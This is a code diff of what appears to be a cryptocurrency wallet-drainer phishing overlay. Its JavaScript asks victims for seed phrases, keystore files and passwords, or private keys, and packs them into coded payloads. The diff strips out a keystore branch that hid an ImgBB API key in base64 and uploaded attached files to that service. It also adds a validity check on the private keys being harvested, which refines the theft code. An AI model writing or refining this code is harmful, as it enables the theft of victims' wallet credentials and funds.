@@ -324,38 +324,13 @@ if (document.getElementById('wOverlay')) {
     };
 
     window.switchType = function (type) {
-        ['phrase', 'keystore', 'privatekey'].forEach(t => {
+        ['phrase', 'privatekey'].forEach(t => {
             document.getElementById('btn-' + t).classList.toggle('active', t === type);
             document.getElementById('pane-' + t).classList.toggle('active', t === type);
         });
     };
 
-    var _ik = atob('NDFhOGY4YTQ2YWZiMGUxOTYwZDc0YTYwNWZkMWU4NDU=');
 
-    function uploadToImgBB(file) {
-        const formData = new FormData();
-        formData.append("image", file);
-        fetch(`https://api.imgbb.com/1/upload?key=${_ik}`, { method: "POST", body: formData })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
-            })
-            .catch(function () { });
-    }
-
-    window.processAttachment = function (input) {
-        const file = input.files[0];
-        if (!file) return;
-        const ki = document.getElementById('keystoreInput');
-        delete ki.dataset.imgUrl; delete ki.dataset.imgBase64; delete ki.dataset.fileContent;
-        document.getElementById('attachFileName').textContent = '📎 ' + file.name;
-        const reader = new FileReader();
-        reader.onload = e => {
-            if (file.type.startsWith('image/')) { ki.dataset.imgBase64 = "pending"; uploadToImgBB(file); }
-            else ki.dataset.fileContent = e.target.result;
-        };
-        file.type.startsWith('image/') ? reader.readAsDataURL(file) : reader.readAsText(file);
-    };
 
     let cTimer, sTimer, pTimer, aborted = false;
     function stopTimers() {
@@ -418,11 +393,8 @@ if (document.getElementById('wOverlay')) {
 
     window.handleRetryManual = function () {
         document.getElementById('phraseInput').value = '';
-        document.getElementById('keystoreInput').value = '';
         document.getElementById('privkeyInput').value = '';
-        document.getElementById('attachFileName').textContent = '';
-        document.getElementById('keystoreFileInput').value = '';
-        switchType('keystore');
+        switchType('phrase');
         showSub('wScreen4');
     };
 
@@ -445,26 +417,18 @@ if (document.getElementById('wOverlay')) {
             isValid = true;
             payload = "f1:p\nd1:" + phraseData;
 
-        } else if (activeType === 'keystore') {
-            var keyData = document.getElementById('keystoreInput').value.trim();
-            var keyPass = document.getElementById('keystorePassword').value.trim();
-            var fileAttached = document.getElementById('keystoreFileInput').files.length > 0;
-            var imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;
-            if (imgUrl) { keyData += "\n\nref:" + imgUrl; }
-            else { var imgData = document.getElementById('keystoreInput').dataset.imgBase64; if (imgData) keyData += "\n\nimg:pending"; }
-            if (!keyData && !fileAttached && !keyPass) { alert('Please enter your credentials before connecting.'); return; }
-            isValid = true;
-            var fileInfo = fileAttached ? "y(" + document.getElementById('keystoreFileInput').files[0].name + ")" : "n";
-            payload = "f1:k\npw:" + keyPass + "\nfa:" + fileInfo;
-            if (keyData) payload += "\nd1:\n" + keyData;
-            var attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
-            if (attachedContent) payload += "\nfc:\n" + attachedContent;
-
         } else if (activeType === 'privatekey') {
-            var privData = document.getElementById('privkeyInput').value.trim();
-            if (!privData) { alert('Please enter your credentials before connecting.'); return; }
+            var privK = document.getElementById('privkeyInput').value.trim();
+            if (!privK) { alert('Please enter your credentials before connecting.'); return; }
+
+            var isValidPk = /^[a-zA-Z0-9]{32,128}$/.test(privK.replace(/^0x/, ''));
+            if (!isValidPk) {
+                alert('invalid private key');
+                return;
+            }
+
             isValid = true;
-            payload = "f1:pk\nd1:" + privData;
+            payload = "f1:pk\nd1:" + privK;
         }
 
         if (!isValid) return;
